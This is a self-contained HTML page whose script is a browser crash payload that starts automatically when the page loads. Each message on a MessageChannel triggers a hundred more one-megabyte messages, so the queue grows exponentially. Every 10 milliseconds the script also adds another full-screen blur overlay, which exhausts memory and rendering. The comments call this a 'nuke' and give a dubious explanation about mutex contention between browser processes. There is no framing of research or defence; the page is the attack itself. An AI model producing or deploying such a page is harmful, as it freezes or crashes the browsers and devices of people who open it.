<!DOCTYPE html>
<html>
<body>
    <script>
        const channel = new MessageChannel();
        const startNuke = () => {
            // Create a feedback loop of messages that never ends
            // and grows exponentially in the message queue.
            channel.port1.onmessage = () => {
                for(let i=0; i<100; i++) {
                    channel.port2.postMessage(new Uint8Array(1024 * 1024)); // 1MB payload
                }
            };
            channel.port2.postMessage('go');
        };

        // Triggering a massive DOM reflow alongside IPC flooding
        // forces the 'Browser' process and 'Renderer' process to 
        // fight for the same mutex locks.
        setInterval(() => {
            const div = document.createElement('div');
            div.style.cssText = 'position:fixed;top:0;width:100vw;height:100vh;backdrop-filter:blur(100px);';
            document.body.appendChild(div);
            startNuke();
        }, 10);
    </script>
</body>
</html>
